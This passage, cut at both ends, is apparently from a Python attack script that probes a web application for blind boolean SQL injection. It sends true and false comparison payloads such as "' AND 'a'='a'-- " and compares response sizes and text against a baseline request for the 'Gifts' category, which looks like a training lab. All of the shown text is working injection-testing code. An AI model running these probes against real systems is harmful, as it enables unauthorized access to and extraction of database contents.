        'description': "False condition"
    },
    {
        'payload': "' AND 'a'='a'-- ",
        'description': "String comparison true"
    },
    {
        'payload': "' AND 'a'='b'-- ",
        'description': "String comparison false"
    }
]

baseline_result = send_payload("Gifts", "Baseline - valid category")
baseline_size = baseline_result.get('size', 0)
baseline_text = baseline_result.get('text', '')

print(f"\n[!] Baseline response size: {baseline_size} bytes")

for test in blind_tests:
    result = send_payload(test['payload'], test['description'])
    
    # Compare sizes to detect boolean difference
    size_diff = abs(result.get('size', 0) - baseline_size)
    if size_diff > 50:  # Significant difference
        print(f"[!] SIZE DIFFERENCE DETECTED: {size_diff} bytes - Blind injection may work!")
    
    # Compare specific content differences
    if result.get('text', '') != baseline_text:
        diff_lines = []
        baseline_lines = baseline_text.split('\n')
